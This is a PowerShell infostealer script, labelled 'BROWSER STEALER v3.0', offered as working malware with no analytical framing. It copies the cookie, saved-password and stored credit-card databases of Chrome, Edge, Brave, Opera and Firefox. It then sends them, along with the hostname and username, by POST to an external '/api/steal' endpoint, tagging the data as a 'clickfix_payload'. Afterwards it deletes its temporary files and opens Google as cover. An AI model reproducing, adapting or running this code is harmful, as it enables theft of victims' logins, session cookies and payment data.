# ============================================================
# BROWSER STEALER — FINAL WITH LOGGING
# ============================================================

$ErrorActionPreference = "Continue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
$LOGFILE = "$env:TEMP\stealer_log.txt"

# Clear log file
Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue

function Write-Log {
    param($Msg, $Color = "White")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $LOGFILE -Value $line
    Write-Host $Msg -ForegroundColor $Color
}

Write-Log "============================================" "Cyan"
Write-Log "  BROWSER STEALER v3.0 (with logging)" "Green"
Write-Log "  Target: $env:COMPUTERNAME" "Yellow"
Write-Log "  Log file: $LOGFILE" "Yellow"
Write-Log "============================================" "Cyan"
Write-Log "" "White"

# ============================================================
# DOWNLOAD SQLITE
# ============================================================

function Get-SQLite {
    Write-Log "[+] Loading SQLite..." "Cyan"
    
    # Try Microsoft.Data.Sqlite
    try {
        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
        Write-Log "[+] SQLite loaded (Microsoft.Data.Sqlite)" "Green"
        return "Microsoft"
    } catch {
        Write-Log "[!] Microsoft.Data.Sqlite failed: $_" "Yellow"
    }
    
    # Try System.Data.SQLite (GAC)
    try {
        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
        Write-Log "[+] SQLite loaded (System.Data.SQLite)" "Green"
        return "System"
    } catch {
        Write-Log "[!] System.Data.SQLite failed: $_" "Yellow"
    }
    
    # Try to load from temp
    $dllPath = "$env:TEMP\SQLite.dll"
    if (Test-Path $dllPath) {
        try {
            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
            Write-Log "[+] SQLite loaded from temp" "Green"
            return "System"
        } catch {
            Write-Log "[!] Failed to load from temp: $_" "Yellow"
        }
    }
    
    # ---- DOWNLOAD FROM NUGET ----
    Write-Log "[+] Downloading SQLite from NuGet..." "Cyan"
    
    try {
        $nugetUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118.0"
        $nupkgPath = "$env:TEMP\sqlite.nupkg"
        $zipPath = "$env:TEMP\sqlite.zip"
        
        Write-Log "[+] Downloading from: $nugetUrl" "Cyan"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $webClient.DownloadFile($nugetUrl, $nupkgPath)
        
        if (Test-Path $nupkgPath -and (Get-Item $nupkgPath).Length -gt 10000) {
            Write-Log "[+] Downloaded: $((Get-Item $nupkgPath).Length) bytes" "Green"
            
            # Rename to zip
            Copy-Item $nupkgPath $zipPath -Force
            
            # Extract
            Write-Log "[+] Extracting SQLite DLL..." "Cyan"
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
            
            # Find the DLL
            $entry = $zip.Entries | Where-Object { 
                $_.FullName -match "lib/net462/System.Data.SQLite.dll" -or 
                $_.FullName -match "lib/net40/System.Data.SQLite.dll" -or
                $_.FullName -match "lib/netstandard2.0/System.Data.SQLite.dll"
            }
            
            if ($entry) {
                Write-Log "[+] Found DLL: $($entry.FullName)" "Green"
                $dllBytes = New-Object byte[] $entry.Length
                $stream = $entry.Open()
                $stream.Read($dllBytes, 0, $dllBytes.Length)
                $stream.Close()
                [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
                $zip.Dispose()
                
                # Load the DLL
                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
                Write-Log "[+] SQLite loaded from NuGet!" "Green"
                
                # Cleanup
                Remove-Item $nupkgPath -Force -ErrorAction SilentlyContinue
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                return "System"
            } else {
                Write-Log "[!] No SQLite DLL found in package" "Red"
                $zip.Dispose()
            }
        } else {
            Write-Log "[!] Download failed or file too small" "Red"
        }
    } catch {
        Write-Log "[!] NuGet download failed: $_" "Red"
    }
    
    Write-Log "[!] SQLite not available" "Red"
    return $null
}

$sqliteType = Get-SQLite

if (-not $sqliteType) {
    Write-Log "[!] Cannot proceed without SQLite" "Red"
    Write-Log "[*] Check internet connection and try again" "Yellow"
    Write-Log "[*] Also check if .NET Framework 4.6+ is installed" "Yellow"
    Write-Log "" "White"
    Write-Log "[!] Log saved to: $LOGFILE" "Yellow"
    Write-Log "Press Enter to exit..." "White"
    Read-Host
    exit
}

# ============================================================
# SQLITE READER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $result = @()
    if (-not (Test-Path $DbPath)) { return $result }
    try {
        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $temp -Force
        
        if ($sqliteType -eq "Microsoft") {
            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $result += $row
            }
            $rdr.Close()
            $conn.Close()
        } else {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $result += $row
            }
            $rdr.Close()
            $conn.Close()
        }
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Log "[!] SQLite read error: $_" "Red"
    }
    return $result
}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-BrowserCookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { 
        Write-Log "[!] No cookies file for $Name" "Yellow"
        return $cookies 
    }
    try {
        Write-Log "[+] Reading $Name cookies..." "Cyan"
        $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
        foreach ($r in $rows) {
            if ($r['name'] -and $r['value']) {
                $d = $r['host_key']
                if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
            }
        }
        Write-Log "[+] $Name cookies found: $($cookies.Count)" "Green"
    } catch {
        Write-Log "[!] Error reading $Name cookies: $_" "Red"
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                try {
                    Write-Log "[+] Reading Firefox cookies from $($d.Name)..." "Cyan"
                    $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                    foreach ($r in $rows) {
                        if ($r['name'] -and $r['value']) {
                            $dmn = $r['host']
                            if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                            $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                        }
                    }
                } catch {
                    Write-Log "[!] Error reading Firefox cookies: $_" "Red"
                }
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-BrowserPasswords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { 
        Write-Log "[!] No passwords file for $Name" "Yellow"
        return $pass 
    }
    try {
        Write-Log "[+] Reading $Name passwords..." "Cyan"
        $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($r in $rows) {
            if ($r['username_value'] -and $r['password_value']) {
                $u = $r['origin_url']
                if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
            }
        }
        Write-Log "[+] $Name passwords found: $($pass.Count)" "Green"
    } catch {
        Write-Log "[!] Error reading $Name passwords: $_" "Red"
    }
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    Write-Log "[+] Reading Firefox passwords from $($d.Name)..." "Cyan"
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname
                            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                            $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                        }
                    }
                } catch {
                    Write-Log "[!] Error reading Firefox passwords: $_" "Red"
                }
            }
        }
    }
    return $pass
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-BrowserCards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { 
        Write-Log "[!] No cards file for $Name" "Yellow"
        return $cards 
    }
    try {
        Write-Log "[+] Reading $Name credit cards..." "Cyan"
        $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($r in $rows) {
            if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                $cards += @{
                    name = $r['name_on_card']
                    number = $r['card_number_encrypted']
                    month = $r['expiration_month']
                    year = $r['expiration_year']
                    browser = $Name
                }
            }
        }
        Write-Log "[+] $Name cards found: $($cards.Count)" "Green"
    } catch {
        Write-Log "[!] Error reading $Name cards: $_" "Red"
    }
    return $cards
}

# ============================================================
# STEAL EVERYTHING
# ============================================================

$allCookies = @()
$allPasswords = @()
$allCards = @()

Write-Log "" "White"

# --- Cookies ---
Write-Log "[+] Chrome cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"

Write-Log "[+] Edge cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Edge"

Write-Log "[+] Brave cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Brave"

Write-Log "[+] Opera cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Opera"

Write-Log "[+] Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

# --- Passwords ---
Write-Log "[+] Chrome passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"

Write-Log "[+] Edge passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"

Write-Log "[+] Brave passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"

Write-Log "[+] Opera passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Opera"

Write-Log "[+] Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

# --- Cards ---
Write-Log "[+] Chrome cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Chrome"

Write-Log "[+] Edge cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Edge"

Write-Log "[+] Brave cards..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Brave"

# ============================================================
# SUMMARY
# ============================================================

Write-Log "" "White"
Write-Log "=== SUMMARY ===" "Green"
Write-Log "Cookies:    $($allCookies.Count)" "Yellow"
Write-Log "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Log "Cards:      $($allCards.Count)" "Yellow"
Write-Log "" "White"

if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
    Write-Log "[!] No data stolen!" "Red"
    Write-Log "[*] Possible reasons:" "Yellow"
    Write-Log "  - No saved passwords/cookies in browsers" "Yellow"
    Write-Log "  - Browser is running (locks the database)" "Yellow"
    Write-Log "  - Close the browser and try again" "Yellow"
    Write-Log "" "White"
}

# ============================================================
# SEND TO SERVER
# ============================================================

$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $env:COMPUTERNAME
}

Write-Log "[+] Sending data..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "[+] Data sent successfully!" "Green"
} catch {
    Write-Log "[!] Failed to send: $_" "Red"
}

# ============================================================
# CLEANUP
# ============================================================

Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"

Write-Log "" "White"
Write-Log "[+] Done!" "Green"
Write-Log "[*] Log saved to: $LOGFILE" "Yellow"
Write-Log "" "White"
Write-Log "Press Enter to exit..." "White"
Read-Host
